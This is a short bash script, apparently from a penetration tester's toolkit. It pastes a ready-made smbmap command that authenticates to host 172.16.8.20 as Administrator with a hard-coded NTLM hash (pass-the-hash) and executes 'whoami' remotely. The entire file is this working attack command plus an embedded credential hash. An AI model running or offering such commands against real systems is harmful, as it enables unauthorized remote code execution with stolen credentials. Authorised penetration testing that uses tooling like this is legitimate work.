#!/bin/bash

: '
smbmap: Execute 'whoami' on smb as Administrator with NTLM hash.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "smbmap -H 172.16.8.20  -u 'Administrator' -p 'aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8' -x whoami"